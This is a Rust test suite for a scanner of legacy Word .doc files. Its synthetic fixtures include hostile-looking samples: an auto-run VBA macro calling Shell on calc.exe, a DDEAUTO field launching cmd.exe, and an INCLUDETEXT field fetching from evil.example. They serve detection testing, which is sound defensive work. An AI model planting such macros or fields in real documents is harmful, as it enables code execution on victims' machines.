//! 구형 DOC(OLE 복합 파일) 분석 테스트. fixture는 합성이다: 코퍼스에 .doc가 없다.

#[path = "../ole_reader/common.rs"]
mod ole_common;

use std::fs;
use std::path::PathBuf;

use bookdoctor::cli::{Options, run};
use bookdoctor::scan::scan_file;
use bookdoctor::viewer::viewer_blocked;
use ole_common::{Cfb, compress, dir_stream, make_cfb, make_cfb_v4, module_stream};
use scan_common::{Category, FileReport, Finding, Format, Severity, ViewerBlocked};

/// `WordDocument` 스트림: FIB 32바이트(wIdent, nFib, flags1)를 512바이트로 채우고 본문을 붙인다.
fn word_stream(flags1: u16, body: &[u8]) -> Vec<u8> {
    let mut s = vec![0u8; 512];
    s[0..2].copy_from_slice(&0xA5ECu16.to_le_bytes());
    s[2..4].copy_from_slice(&0x00C1u16.to_le_bytes());
    s[10..12].copy_from_slice(&flags1.to_le_bytes());
    s.extend_from_slice(body);
    s
}

fn doc_cfb(extra: &[(&str, &[u8])], flags1: u16, body: &[u8]) -> Cfb {
    let word = word_stream(flags1, body);
    let mut streams: Vec<(&str, &[u8])> = vec![("WordDocument", &word)];
    streams.extend_from_slice(extra);
    make_cfb(&streams)
}

fn write(name: &str, bytes: &[u8]) -> (tempfile::TempDir, PathBuf) {
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join(name);
    fs::write(&p, bytes).unwrap();
    (d, p)
}

fn scan_doc(extra: &[(&str, &[u8])], flags1: u16, body: &[u8]) -> FileReport {
    let (_d, p) = write("a.doc", &doc_cfb(extra, flags1, body).bytes);
    scan_file(&p, &Options::default())
}

fn finding<'a>(r: &'a FileReport, code: &str) -> &'a Finding {
    r.findings.iter().find(|f| f.code == code).unwrap_or_else(|| panic!("{code} missing: {:?} / {:?}", r.findings, r.reasons))
}

fn vba_streams(source: &str) -> Vec<(String, Vec<u8>)> {
    let dir = compress(&dir_stream(&[("Module1", "Module1", 16)]));
    vec![("Macros/VBA/dir".to_string(), dir), ("Macros/VBA/Module1".to_string(), module_stream(16, source))]
}

fn scan_vba(source: &str) -> FileReport {
    let owned = vba_streams(source);
    let extra: Vec<(&str, &[u8])> = owned.iter().map(|(n, b)| (n.as_str(), b.as_slice())).collect();
    scan_doc(&extra, 0, b"hello")
}

#[test]
fn minimal_doc_has_no_findings() {
    let r = scan_doc(&[], 0, b"plain text body");
    assert_eq!(r.format, Some(Format::Doc));
    assert!(r.findings.is_empty() && !r.incomplete, "{:?} {:?}", r.findings, r.reasons);
}

#[test]
fn ole_without_a_worddocument_stream_is_a_format_mismatch() {
    let cfb = make_cfb(&[("Workbook", &[1u8; 600][..])]);
    let (_d, p) = write("a.doc", &cfb.bytes);
    let r = scan_file(&p, &Options::default());
    let f = finding(&r, "FORMAT_MISMATCH");
    assert_eq!((f.category, f.severity), (Category::Defect, Severity::Medium));
}

#[test]
fn encrypted_doc_is_incomplete_and_cyan_not_clean() {
    let r = scan_doc(&[], 0x0100, b"cipher");
    assert!(r.incomplete && r.reasons.iter().any(|x| FileReport::is_encrypted_reason(x)), "{:?}", r.reasons);
    assert!(r.findings.is_empty(), "{:?}", r.findings);
}

#[test]
fn vba_project_is_high_and_benign_macros_are_not_critical() {
    let r = scan_vba("Sub Hello()\r\n  MsgBox \"hi\"\r\nEnd Sub\r\n");
    let f = finding(&r, "DOC_VBA_MACRO");
    assert_eq!((f.category, f.severity), (Category::Security, Severity::High));
    assert!(!r.has("DOC_VBA_AUTOEXEC") && !r.has("DOC_VBA_SUSPICIOUS"));
}

#[test]
fn autoexec_alone_is_high_and_autoexec_with_shell_is_critical() {
    let r = scan_vba("Sub AutoOpen()\r\n  MsgBox \"hi\"\r\nEnd Sub\r\n");
    assert_eq!(finding(&r, "DOC_VBA_AUTOEXEC").severity, Severity::High);
    assert!(!r.has("DOC_VBA_SUSPICIOUS"));
    let r = scan_vba("Private Sub Document_Open()\r\n  Shell \"calc.exe\"\r\nEnd Sub\r\n");
    assert_eq!(finding(&r, "DOC_VBA_SUSPICIOUS").severity, Severity::Critical);
    assert!(r.has("DOC_VBA_AUTOEXEC"));
    for name in ["AutoExec", "AutoClose", "Auto_Open", "DocumentOpen", "Workbook_Open", "Document_Close"] {
        let r = scan_vba(&format!("Sub {name}()\r\nEnd Sub\r\n"));
        assert!(r.has("DOC_VBA_AUTOEXEC"), "{name}");
    }
}

#[test]
fn macro_free_doc_whose_text_mentions_shell_and_autoopen_is_clean() {
    let r = scan_doc(&[], 0, b"The word Shell and AutoOpen and powershell appear in this prose only.");
    assert!(r.findings.is_empty(), "{:?}", r.findings);
}

#[test]
fn an_unreadable_vba_project_is_still_high_and_marks_the_scan_incomplete() {
    let r = scan_doc(&[("Macros/VBA/dir", b"not a compressed stream"), ("Macros/VBA/Module1", b"x")], 0, b"hi");
    assert_eq!(finding(&r, "DOC_VBA_MACRO").severity, Severity::High);
    assert!(r.incomplete, "{:?}", r.reasons);
}

#[test]
fn object_pool_is_high_and_native_payloads_are_checked_for_executables() {
    let r = scan_doc(&[("ObjectPool/_1/CompObj", &[0u8; 100][..])], 0, b"hi");
    assert_eq!(finding(&r, "DOC_OLE_OBJECT").severity, Severity::High);
    assert!(!r.has("EMBEDDED_EXECUTABLE"));

    let native = |label: &str, payload: &[u8]| {
        let mut body = Vec::new();
        body.extend_from_slice(&2u16.to_le_bytes());
        body.extend_from_slice(label.as_bytes());
        body.push(0);
        body.extend_from_slice(format!("C:\\tmp\\{label}").as_bytes());
        body.push(0);
        body.extend_from_slice(&0u32.to_le_bytes());
        body.extend_from_slice(&0u32.to_le_bytes());
        body.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        body.extend_from_slice(payload);
        let mut s = (body.len() as u32).to_le_bytes().to_vec();
        s.extend(body);
        s
    };
    let by_name = native("payload.exe", b"not really a binary");
    let r = scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &by_name)], 0, b"hi");
    assert!(r.findings.iter().any(|f| f.code == "EMBEDDED_EXECUTABLE" && f.severity == Severity::High), "{:?}", r.findings);

    let mut pe = vec![0u8; 0x100];
    pe[..2].copy_from_slice(b"MZ");
    pe[0x3C..0x40].copy_from_slice(&0x40u32.to_le_bytes());
    pe[0x40..0x44].copy_from_slice(b"PE\0\0");
    let by_magic = native("notes.txt", &pe);
    let r = scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &by_magic)], 0, b"hi");
    assert!(r.has("EMBEDDED_EXECUTABLE"), "{:?}", r.findings);

    let picture = native("pic.png", b"\x89PNG\r\n\x1a\n some picture bytes");
    let r = scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &picture)], 0, b"hi");
    assert!(!r.has("EMBEDDED_EXECUTABLE") && r.has("DOC_OLE_OBJECT"), "{:?}", r.findings);
}

fn utf16le(s: &str) -> Vec<u8> {
    s.encode_utf16().flat_map(u16::to_le_bytes).collect()
}

#[test]
fn dde_fields_in_8bit_and_utf16_text_are_flagged() {
    let text = "intro \u{13} DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\" \u{14}result\u{15} outro";
    let r = scan_doc(&[], 0, text.as_bytes());
    assert_eq!(finding(&r, "DOC_DDE_FIELD").severity, Severity::Critical);
    let r = scan_doc(&[], 0, &utf16le(text));
    assert_eq!(finding(&r, "DOC_DDE_FIELD").severity, Severity::Critical);
}

#[test]
fn ordinary_fields_and_remote_includes_are_classified_like_the_ooxml_rules() {
    let normal = "page \u{13} PAGE \u{14}1\u{15} and \u{13} TOC \\\\o \"1-3\" \u{14}x\u{15}";
    assert!(scan_doc(&[], 0, normal.as_bytes()).findings.is_empty());
    let remote = "x \u{13} INCLUDETEXT \"http://evil.example/x.doc\" \u{14}r\u{15}";
    assert_eq!(finding(&scan_doc(&[], 0, remote.as_bytes()), "DOC_DANGEROUS_FIELD").severity, Severity::High);
}

#[test]
fn a_giant_unterminated_field_is_bounded() {
    let mut body = vec![0x13u8];
    body.extend(vec![b'A'; 3_000_000]);
    let start = std::time::Instant::now();
    let r = scan_doc(&[], 0, &body);
    assert!(start.elapsed() < std::time::Duration::from_secs(5));
    assert!(!r.has("DOC_DDE_FIELD"));
}

#[test]
fn structural_damage_is_reported_with_ole_codes_and_a_security_summary() {
    let cfb = doc_cfb(&[("Data", &[7u8; 5000][..])], 0, b"hi");
    let bytes = cfb.bytes.clone();
    let start = ole_reader::OleFile::from_bytes(bytes.clone(), &ole_reader::Limits::default()).unwrap().find("Data").unwrap().start;
    let mut b = bytes;
    let at = cfb.fat_entry_offset(start);
    b[at..at + 4].copy_from_slice(&start.to_le_bytes());
    let (_d, p) = write("loop.doc", &b);
    let r = scan_file(&p, &Options::default());
    let f = finding(&r, "OLE_FAT_CYCLE");
    assert_eq!((f.category, f.severity), (Category::Defect, Severity::High));
    let s = finding(&r, "OLE_MALFORMED_STRUCTURE");
    assert_eq!((s.category, s.severity), (Category::Security, Severity::High));
}

#[test]
fn a_truncated_ole_file_is_incomplete_and_never_panics() {
    let mut b = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
    b.resize(512, 0);
    let (_d, p) = write("cut.doc", &b);
    let r = scan_file(&p, &Options::default());
    assert!(r.incomplete && !r.reasons.iter().any(|x| x.starts_with("panic")), "{:?}", r.reasons);
}

#[test]
fn doc_and_dot_are_collected_and_lookalikes_are_not() {
    let d = tempfile::tempdir().unwrap();
    let bytes = doc_cfb(&[], 0, b"x").bytes;
    for name in ["a.doc", "b.DOT", "c.docs"] {
        fs::write(d.path().join(name), &bytes).unwrap();
    }
    let mut out = Vec::new();
    run(&["-r".into(), "--min-severity".into(), "low".into(), "--json".into(), d.path().to_string_lossy().into_owned()], &mut out);
    let out = String::from_utf8(out).unwrap();
    assert!(!out.contains("c.docs"), "{out}");
    let (_d2, p) = write("b.dot", &bytes);
    assert_eq!(scan_file(&p, &Options::default()).format, Some(Format::Doc));
}

#[test]
fn doc_extension_with_other_content_is_a_mismatch() {
    let (_d, p) = write("a.doc", "그냥 텍스트\n".repeat(50).as_bytes());
    let r = scan_file(&p, &Options::default());
    assert!(r.has("FORMAT_MISMATCH"), "{:?}", r.findings);
    let mut pe = vec![0u8; 0x100];
    pe[..2].copy_from_slice(b"MZ");
    pe[0x3C..0x40].copy_from_slice(&0x40u32.to_le_bytes());
    pe[0x40..0x44].copy_from_slice(b"PE\0\0");
    let (_d, p) = write("b.doc", &pe);
    assert!(scan_file(&p, &Options::default()).has("DISGUISED_EXECUTABLE"));
}

#[test]
fn a_zip_named_doc_is_scanned_as_a_docx_package() {
    let d = tempfile::tempdir().unwrap();
    let p = d.path().join("renamed.doc");
    let mut z = zip::ZipWriter::new(fs::File::create(&p).unwrap());
    z.start_file("hello.txt", zip::write::SimpleFileOptions::default()).unwrap();
    std::io::Write::write_all(&mut z, b"hi").unwrap();
    z.finish().unwrap();
    let r = scan_file(&p, &Options::default());
    assert!(r.has("FORMAT_MISMATCH") && r.has("OOXML_NOT_DOCX"), "{:?}", r.findings);
}

#[test]
fn the_viewer_table_does_not_apply_to_doc() {
    assert_eq!(viewer_blocked(Format::Doc, "ANYTHING"), ViewerBlocked::NotApplicable);
}

#[test]
fn a_nested_field_does_not_hide_the_outer_instruction() {
    // 바깥 지시문 중간에 안쪽 필드가 끼어도 바깥 지시문 전체를 본다(Word는 안쪽 결과를 바깥 지시문에 이어 붙인다).
    let before = "x \u{13} DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \u{13} QUOTE a \u{14}b\u{15} \"/k calc\" \u{14}r\u{15} y";
    let after = "x \u{13} INCLUDETEXT \u{13} MERGEFIELD a \u{14}b\u{15} \"http://evil.example/x.doc\" \u{14}r\u{15} y";
    for (text, code) in [(before, "DOC_DDE_FIELD"), (after, "DOC_DANGEROUS_FIELD")] {
        assert!(scan_doc(&[], 0, text.as_bytes()).has(code), "8bit {code}");
        assert!(scan_doc(&[], 0, &utf16le(text)).has(code), "utf16 {code}");
    }
    // 중첩이 매우 깊어도 시간이 터지지 않고 미완료로 남는다.
    let deep = "\u{13} A ".repeat(100_000);
    let start = std::time::Instant::now();
    let r = scan_doc(&[], 0, deep.as_bytes());
    assert!(start.elapsed() < std::time::Duration::from_secs(5));
    assert!(r.incomplete, "{:?}", r.reasons);
}

#[test]
fn a_word_stream_larger_than_the_field_limit_is_incomplete() {
    // 512바이트 섹터 fixture는 DIFAT 한도(약 7MiB)에 걸려 4096바이트 섹터로 만든다.
    let word = word_stream(0, &vec![b'A'; 17 * 1024 * 1024]);
    let (_d, p) = write("big.doc", &make_cfb_v4(&[("WordDocument", &word)]).bytes);
    let r = scan_file(&p, &Options::default());
    assert!(r.incomplete, "{:?}", r.reasons);
    assert!(r.reasons.iter().any(|m| m.contains("WordDocument")), "{:?}", r.reasons);
}

#[test]
fn a_doc_named_file_with_unanalyzed_content_is_incomplete() {
    let r = scan_file(&write("a.doc", b"<html><body>hello</body></html>").1, &Options::default());
    assert!(r.has("FORMAT_MISMATCH") && r.incomplete, "{:?} {:?}", r.findings, r.reasons);
    let r = scan_file(&write("b.doc", "그냥 텍스트\n".repeat(50).as_bytes()).1, &Options::default());
    assert!(r.incomplete, "{:?}", r.reasons);
}

#[test]
fn an_executable_hidden_in_the_native_source_or_temp_path_is_flagged() {
    // 레이블은 얌전하게 두고 원본 경로나 임시 경로에만 실행 파일 이름을 넣는다.
    let native = |label: &str, src: &str, temp: &str| {
        let mut body = Vec::new();
        body.extend_from_slice(&2u16.to_le_bytes());
        body.extend_from_slice(label.as_bytes());
        body.push(0);
        body.extend_from_slice(src.as_bytes());
        body.push(0);
        body.extend_from_slice(&0u32.to_le_bytes());
        body.extend_from_slice(&((temp.len() + 1) as u32).to_le_bytes());
        body.extend_from_slice(temp.as_bytes());
        body.push(0);
        body.extend_from_slice(&4u32.to_le_bytes());
        body.extend_from_slice(b"data");
        let mut s = (body.len() as u32).to_le_bytes().to_vec();
        s.extend(body);
        s
    };
    for (name, bytes) in [("src", native("notes.txt", "C:\\x\\run.exe", "C:\\t\\a.txt")), ("temp", native("notes.txt", "C:\\x\\a.txt", "C:\\t\\run.scr"))] {
        let r = scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &bytes)], 0, b"hi");
        assert!(r.has("EMBEDDED_EXECUTABLE"), "{name}: {:?}", r.findings);
    }
    let clean = native("notes.txt", "C:\\x\\a.txt", "C:\\t\\a.txt");
    assert!(!scan_doc(&[("ObjectPool/_1/\u{1}Ole10Native", &clean)], 0, b"hi").has("EMBEDDED_EXECUTABLE"));
}

fn scan_named(name: &str, cfb: &Cfb) -> FileReport {
    let (_d, p) = write(name, &cfb.bytes);
    scan_file(&p, &Options::default())
}

#[test]
fn docx_that_is_an_encrypted_package_is_incomplete_cyan() {
    let cfb = make_cfb(&[("EncryptionInfo", &[4u8, 0, 4, 0, 0, 0][..]), ("EncryptedPackage", &[0u8; 64][..])]);
    for name in ["a.docx", "b.docm", "c.doc"] {
        let r = scan_named(name, &cfb);
        assert!(r.incomplete, "{name}: {:?}", r.reasons);
        assert!(r.reasons.iter().any(|m| FileReport::is_encrypted_reason(m) && m.contains("EncryptedPackage")), "{name}: {:?}", r.reasons);
        // 암호화 패키지는 구형 Word 문서가 아니므로 WordDocument 부재를 결함으로 칠하지 않는다.
        assert!(!r.findings.iter().any(|f| f.location == "WordDocument"), "{name}: {:?}", r.findings);
    }
    // 이름이 docx인데 OLE 내용이므로 확장자 불일치는 알린다. `.doc`는 OLE가 맞으니 알리지 않는다.
    assert!(scan_named("a.docx", &cfb).has("FORMAT_MISMATCH"));
    assert!(!scan_named("c.doc", &cfb).has("FORMAT_MISMATCH"));
}

#[test]
fn docx_that_is_a_renamed_doc_is_analyzed_as_doc() {
    let owned = vba_streams("Sub AutoOpen()\nShell \"calc\"\nEnd Sub\n");
    let mut streams: Vec<(&str, &[u8])> = owned.iter().map(|(n, b)| (n.as_str(), b.as_slice())).collect();
    let word = word_stream(0, b"hello");
    streams.push(("WordDocument", &word));
    let r = scan_named("renamed.docx", &make_cfb(&streams));
    assert!(r.has("FORMAT_MISMATCH"), "{:?}", r.findings);
    assert!(r.has("DOC_VBA_MACRO"), "{:?} {:?}", r.findings, r.reasons);
    assert_eq!(finding(&r, "DOC_VBA_SUSPICIOUS").severity, Severity::Critical);
}

#[test]
fn docx_ole_without_either_stream_stays_plain_incomplete() {
    let r = scan_named("odd.docx", &make_cfb(&[("Something", &[1u8, 2, 3][..])]));
    assert!(r.has("FORMAT_MISMATCH"), "{:?}", r.findings);
    assert!(r.incomplete && r.reasons.iter().any(|m| m.contains("OLE")), "{:?}", r.reasons);
    assert!(!r.reasons.iter().any(|m| FileReport::is_encrypted_reason(m)), "{:?}", r.reasons);
    assert!(!r.findings.iter().any(|f| f.code.starts_with("DOC_")), "{:?}", r.findings);
}
